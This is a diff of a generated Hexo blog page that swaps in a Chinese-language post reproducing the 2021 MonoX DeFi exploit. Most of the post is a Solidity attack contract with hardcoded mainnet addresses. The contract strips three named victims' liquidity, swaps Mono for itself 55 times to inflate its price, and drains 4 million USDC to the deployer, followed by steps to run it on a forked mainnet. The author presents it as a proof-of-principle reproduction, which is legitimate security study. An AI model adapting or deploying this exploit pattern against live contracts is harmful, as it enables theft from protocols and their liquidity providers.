@@ -19,22 +19,26 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="因为之前被不止一位大佬社工过, 吓得我删了博客.还好都没有恶意, 现在重写一个.">
+    <meta name="description" content="MonoX_VulMonoX被攻击事件的分析和复现 攻击事件的分析 部署即攻击版完整代码 步骤拆分版完整代码 核心攻击代码 注意下面的代码缺少Interface, 不能直接复制 所有的攻击步骤都在构造函数constructor()中实现, 也就是说当合约部署完成,攻击也已经完成 本次复现仅做原理性验证, 攻击者通过闪电贷来避免滑点,实现利益最大化 但其实不调用闪电贷,攻击的主要步骤也已经完成,所以">
 <meta property="og:type" content="article">
-<meta property="og:title" content="重写一个">
-<meta property="og:url" content="http://example.com/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/index.html">
+<meta property="og:title" content="MonoX_Vul_Poc">
+<meta property="og:url" content="http://example.com/2021/12/09/MonoX-Vul-Poc/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="因为之前被不止一位大佬社工过, 吓得我删了博客.还好都没有恶意, 现在重写一个.">
+<meta property="og:description" content="MonoX_VulMonoX被攻击事件的分析和复现 攻击事件的分析 部署即攻击版完整代码 步骤拆分版完整代码 核心攻击代码 注意下面的代码缺少Interface, 不能直接复制 所有的攻击步骤都在构造函数constructor()中实现, 也就是说当合约部署完成,攻击也已经完成 本次复现仅做原理性验证, 攻击者通过闪电贷来避免滑点,实现利益最大化 但其实不调用闪电贷,攻击的主要步骤也已经完成,所以">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2222-02-22T14:22:22.000Z">
-<meta property="article:modified_time" content="2021-12-09T08:06:01.269Z">
+<meta property="og:image" content="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6.png">
+<meta property="og:image" content="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E6%94%BB%E5%87%BB%E5%89%8D%E7%9A%84MetaMask%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png">
+<meta property="og:image" content="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E6%94%BB%E5%87%BB%E5%90%8E%E7%9A%84%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png">
+<meta property="article:published_time" content="2021-12-09T08:33:06.000Z">
+<meta property="article:modified_time" content="2021-12-09T08:34:11.760Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6.png">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
     <link rel="icon" href="/assets/favicon.ico">
     
-    <title>重写一个 · W2Ning</title>
+    <title>MonoX_Vul_Poc · W2Ning</title>
     <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
 /* This file is meant as a standalone workflow for
 - testing support for link[rel=preload]
@@ -259,7 +263,7 @@
                 <a href="/">学</a>
             </div>
             <div class="post-title header-element">
-                <a href="#" class="post-name">重写一个</a>
+                <a href="#" class="post-name">MonoX_Vul_Poc</a>
             </div>
         </div>
     
@@ -305,7 +309,7 @@
         <h1 class="intro-title">
             <!-- 主页  -->
             
-                重写一个
+                MonoX_Vul_Poc
             <!-- 404 -->
             
         </h1>
@@ -324,13 +328,13 @@
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">34</span>Reading time: <span class="post-count reading-time">1 min</span></span>
+                        <span>Word count: <span class="post-count word-count">590</span>Reading time: <span class="post-count reading-time">2 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <!-- 撰写日期 -->
                     <span class="iconfont-archer post-intro-calander">&#xe676;</span>
-                    <span class="post-intro-time">2222/02/22</span>
+                    <span class="post-intro-time">2021/12/09</span>
                     <!-- busuanzi -->
                     
                         <span id="busuanzi_container_page_pv" class="busuanzi-pv">
@@ -485,16 +489,45 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <p>因为之前被不止一位大佬社工过, 吓得我删了博客.<br>还好都没有恶意, 现在重写一个.</p>
+        <h1 id="MonoX-Vul"><a href="#MonoX-Vul" class="headerlink" title="MonoX_Vul"></a>MonoX_Vul</h1><p>MonoX被攻击事件的分析和复现</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/W2Ning/MonoX_Vul_/blob/main/MonoX%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90.md">攻击事件的分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/W2Ning/MonoX_Vul_/blob/main/poc.sol">部署即攻击版完整代码</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/W2Ning/MonoX_Vul_/blob/main/Step_By_Step.sol">步骤拆分版完整代码</a></p>
+<h3 id="核心攻击代码"><a href="#核心攻击代码" class="headerlink" title="核心攻击代码"></a>核心攻击代码</h3><ul>
+<li>注意下面的代码缺少Interface, 不能直接复制</li>
+<li>所有的攻击步骤都在构造函数<code>constructor()</code>中实现, 也就是说当合约部署完成,攻击也已经完成</li>
+<li>本次复现仅做原理性验证, 攻击者通过闪电贷来避免滑点,实现利益最大化</li>
+<li>但其实不调用闪电贷,攻击的主要步骤也已经完成,所以攻击者的后续操作就没有再跟进</li>
+<li>POC只尝试从池子中拿走400万<code>USDC</code>,就结束了攻击</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">contract POC&#123;</span><br><span class="line"></span><br><span class="line">    address WETH9_Address = <span class="number">0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2</span>;</span><br><span class="line"></span><br><span class="line">    address Mono_Token_Address = <span class="number">0x2920f7d6134f4669343e70122cA9b8f19Ef8fa5D</span>;</span><br><span class="line"></span><br><span class="line">    address MonoXPool_Address = <span class="number">0x59653E37F8c491C3Be36e5DD4D503Ca32B5ab2f4</span>;</span><br><span class="line"></span><br><span class="line">    address Monoswap_address =  <span class="number">0xC36a7887786389405EA8DA0B87602Ae3902B88A1</span>;</span><br><span class="line">    <span class="comment">// 无辜的大户地址1</span></span><br><span class="line">    address Innocent_user_1 = <span class="number">0x7B9aa6ED8B514C86bA819B99897b69b608293fFC</span>;</span><br><span class="line">    <span class="comment">// 无辜的大户地址2</span></span><br><span class="line">    address Innocent_user_2 = <span class="number">0x81D98c8fdA0410ee3e9D7586cB949cD19FA4cf38</span>;</span><br><span class="line">    <span class="comment">// 无辜的大户地址3</span></span><br><span class="line">    address Innocent_user_3 = <span class="number">0xab5167e8cC36A3a91Fd2d75C6147140cd1837355</span>;</span><br><span class="line"></span><br><span class="line">    address USDC_Address =  <span class="number">0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48</span>;</span><br><span class="line"></span><br><span class="line">    uint256 Amount_Of_MonoToken_On_XPool;</span><br><span class="line"></span><br><span class="line">    uint256 public Amount_Of_USDC_On_XPool;</span><br><span class="line">    </span><br><span class="line">    uint256 public Amoount_Of_Mono_On_This; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>)  <span class="title">public</span> <span class="title">payable</span>&#123;</span><br><span class="line">        <span class="comment">// 把MonoToken的全部额度授权给MonoSwap </span></span><br><span class="line">        MonoToken(Mono_Token_Address).approve(Monoswap_address,type(uint256).max);</span><br><span class="line">        <span class="comment">// 把0.1个ETH换成0.1个WETH</span></span><br><span class="line">        WETH9(WETH9_Address).deposit&#123;<span class="attr">value</span>:address(<span class="built_in">this</span>).balance,<span class="attr">gas</span>:<span class="number">40000</span>&#125;();</span><br><span class="line">        <span class="comment">// 把0.1个WETH的额度授权给MonoSwap</span></span><br><span class="line">        WETH9(WETH9_Address).approve(Monoswap_address,<span class="number">0.1</span> ether);</span><br><span class="line">        <span class="comment">// 用0.1个WETH在MonoSwap上购买MonoToken</span></span><br><span class="line">        Monoswap(Monoswap_address).swapExactTokenForToken(WETH9_Address,Mono_Token_Address,<span class="number">0.1</span> ether,<span class="number">1</span>,address(<span class="built_in">this</span>),block.timestamp);</span><br><span class="line">        <span class="comment">// 把XPool中三个大户的流动性全部剔除</span></span><br><span class="line">        RemoveLiquidity_From_3_Users();</span><br><span class="line">        <span class="comment">// 添加自己的流动性</span></span><br><span class="line">        Monoswap(Monoswap_address).addLiquidity(Mono_Token_Address,<span class="number">196875656</span>,address(<span class="built_in">this</span>));</span><br><span class="line">        <span class="comment">// 用Mono换Mono 共55次</span></span><br><span class="line">        Swap_Mono_for_Mono_55_Times();</span><br><span class="line">        <span class="comment">// 用极少量的Mono换到400万的USDC</span></span><br><span class="line">        Swap_Mono_For_USDC();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">RemoveLiquidity_From_3_Users</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line">        uint256 balance_Of_User1 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_1,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User1,Innocent_user_1,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balance_Of_User2 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_2,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User2,Innocent_user_2,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        uint256 balance_Of_User3 = MonoXPool(MonoXPool_Address).balanceOf(Innocent_user_3,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        Monoswap(Monoswap_address).removeLiquidity(Mono_Token_Address,balance_Of_User3,Innocent_user_3,<span class="number">0</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Swap_Mono_for_Mono_55_Times</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(uint256 i=<span class="number">0</span>;i &lt; <span class="number">55</span>; i++)&#123;</span><br><span class="line"></span><br><span class="line">            (,,,,,,Amount_Of_MonoToken_On_XPool,,) = Monoswap(Monoswap_address).pools(Mono_Token_Address);</span><br><span class="line"></span><br><span class="line">            Monoswap(Monoswap_address).swapExactTokenForToken(Mono_Token_Address,Mono_Token_Address,Amount_Of_MonoToken_On_XPool-<span class="number">1</span>,<span class="number">0</span>,address(<span class="built_in">this</span>),block.timestamp);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Swap_Mono_For_USDC</span>(<span class="params"></span>) <span class="title">internal</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        (,,,,,,Amount_Of_USDC_On_XPool,,) = Monoswap(Monoswap_address).pools(USDC_Address);</span><br><span class="line"></span><br><span class="line">        Amoount_Of_Mono_On_This = MonoToken(Mono_Token_Address).balanceOf(address(<span class="built_in">this</span>));</span><br><span class="line"></span><br><span class="line">        Monoswap(Monoswap_address).swapTokenForExactToken(Mono_Token_Address,USDC_Address,Amoount_Of_Mono_On_This,<span class="number">4000000000000</span>,msg.sender,block.timestamp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    receive() payable external&#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">onERC1155Received</span>(<span class="params">address _operator, address _from, uint256 _id, uint256 _value, bytes calldata _data</span>) <span class="title">external</span> <span class="title">returns</span>(<span class="params">bytes4</span>)</span>&#123;</span><br><span class="line">        bytes4 a = <span class="number">0xf23a6e61</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="复现方法"><a href="#复现方法" class="headerlink" title="复现方法"></a>复现方法</h3><ul>
+<li>主网上的攻击发生在高度为<code>13715026</code>的块上, 所以同样我们选前一个块去fork</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx ganache-cli  --fork https://eth-mainnet.alchemyapi.io/v2/Your_API_KEY@13715025   -l 4294967295</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>部署攻击合约 注意部署时要带上100个<code>Finney</code>, 也就是0.1个<code>ETH</code></li>
+</ul>
+<p><img src="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E9%83%A8%E7%BD%B2%E6%94%BB%E5%87%BB%E5%90%88%E7%BA%A6.png" alt="image"></p>
+<ul>
+<li>攻击前的MetaMask钱包余额</li>
+</ul>
+<p><img src="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E6%94%BB%E5%87%BB%E5%89%8D%E7%9A%84MetaMask%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png" alt="image"></p>
+<ul>
+<li>攻击后的钱包余额</li>
+</ul>
+<p><img src="https://github.com/W2Ning/MonoX_Vul_/blob/main/images/%E6%94%BB%E5%87%BB%E5%90%8E%E7%9A%84%E9%92%B1%E5%8C%85%E4%BD%99%E9%A2%9D.png" alt="image"></p>
 
     </article>
     <!-- license -->
     
         <div class="license-wrapper">
             <p>Author：<a href="http://example.com">John Doe</a>
-            <p>Link：<a href="http://example.com/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/">http://example.com/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/</a>
-            <p>Publish date：<a href="http://example.com/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/">February 22nd 2222, 10:22:22 pm</a>
-            <p>Update date：<a href="http://example.com/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/">December 9th 2021, 4:06:01 pm</a>
+            <p>Link：<a href="http://example.com/2021/12/09/MonoX-Vul-Poc/">http://example.com/2021/12/09/MonoX-Vul-Poc/</a>
+            <p>Publish date：<a href="http://example.com/2021/12/09/MonoX-Vul-Poc/">December 9th 2021, 4:33:06 pm</a>
+            <p>Update date：<a href="http://example.com/2021/12/09/MonoX-Vul-Poc/">December 9th 2021, 4:34:11 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -502,12 +535,17 @@
     <ul class="post-paginator">
         <li class="next">
             
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2222/02/22/%E9%87%8D%E5%86%99%E4%B8%80%E4%B8%AA/" title="重写一个">
+                    <div class="nextTitle">重写一个</div>
+                </a>
+            
         </li>
         <li class="previous">
             
                 <div class="prevSlogan">Previous Post</div>
-                <a href="/2021/12/09/MonoX-Vul-Poc/" title="MonoX_Vul_Poc">
-                    <div class="prevTitle">MonoX_Vul_Poc</div>
+                <a href="/2021/12/09/Compound-Bug-Analysis/" title="Compound_Bug_Analysis">
+                    <div class="prevTitle">Compound_Bug_Analysis</div>
                 </a>
             
         </li>
@@ -634,7 +672,7 @@
                 <div class="toc-catalog">
                     <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                 </div>
-                
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MonoX-Vul"><span class="toc-number">1.</span> <span class="toc-text">MonoX_Vul</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81"><span class="toc-number">1.0.1.</span> <span class="toc-text">核心攻击代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E6%96%B9%E6%B3%95"><span class="toc-number">1.0.2.</span> <span class="toc-text">复现方法</span></a></li></ol></li></ol></li></ol>
             </div>
         
         <!-- sidebar -->
